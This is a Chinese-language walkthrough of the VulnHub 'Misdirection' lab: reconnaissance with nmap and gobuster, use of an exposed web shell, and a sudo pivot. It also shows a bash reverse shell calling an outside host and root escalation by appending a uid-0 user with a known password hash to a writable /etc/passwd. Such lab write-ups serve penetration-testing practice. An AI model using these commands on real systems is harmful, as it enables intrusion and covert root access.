> 涉及 passwd文件提权，蜜罐，前期仔细信息收集，枚举 webshell，使用/bin/bash 进行反弹shell
## 靶机信息

级别:容易
下载地址：[https://download.vulnhub.com/misdirection/Misdirection.zip](https://download.vulnhub.com/misdirection/Misdirection.zip)
描述:该机器的目的是让 OSCP 学生进一步发展、加强和练习他们的考试方法。
这对于 VirtualBox 而不是 VMware 效果更好


## Recon
### nmap

```shell
sudo nmap -sn 192.168.1.0/24
//IP:192.168.1.143

sudo nmap --min-rate 10000 -sT -p- 192.168.1.143
//Ports:
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy

sudo nmap -sT -p 22,80,3306,8080 -sC -sV -O 192.168.1.143 
```

## Web
![[Pasted image 20231008162919.png]]

![[Pasted image 20231008163937.png]]

### 目录爆破
```shell
gobuster dir -u http://192.168.1.143:8080/ -w /usr/share/wordlists/dirb/common.txt 
```
![[Pasted image 20231008164120.png]]
debug目录是一个控制台

```shell
p0wny@shell:/home/brexit# sudo -l

//
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash

// 权限看到brexit用户可以使用/bin/bash

```
## 提权
```shell
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.136/1234 0>&1' //执行反弹shell
sudo -u brexit /bin/bash //切换到brexit用户

python -c "import pty;pty.spawn('/bin/bash')" //生成tty shell
//得到user flag：404b9193154be7fbbc56d7534cb26339

find / -type f -perm -ug=rwx 2>/dev/null
```
![[Pasted image 20231008202335.png]]
发现对passwd文件有rwx权限

### passwd文件提权

![[Pasted image 20231008202425.png]]
x:表示密码在/etc/shadow文件中

这里直接在passwd文件中添加一个用户并给予它root权限,对/etc/passwd这类系统文件操作时候，可以将文件备份,防止输入错误导致无法登录等问题(cp /etc/passwd /tmp/passwd.bak)

```shell
openssl passwd -1(数字1) -salt [username] [password] > hash.txt

openssl passwd -1 -salt hacker 12345 > hash.txt
// $1$hacker$sBhvxhSYsmVUe1EX5faud.(不要遗漏末尾的点号)

// hacker:$1$hacker$sBhvxhSYsmVUe1EX5faud.:0:0:root/root:/bin/bash
//安全起见 先echo到/tmp/123下，查看是否有错误
echo 'hacker:$1$hacker$sBhvxhSYsmVUe1EX5faud.:0:0:root/root:/bin/bash' >> /tmp/123

su hacker //密码为12345，此时hacker用户拥有了root权限
// root flag:0d2c6222bfdd3701e0fa12a9a9dc9c8c
```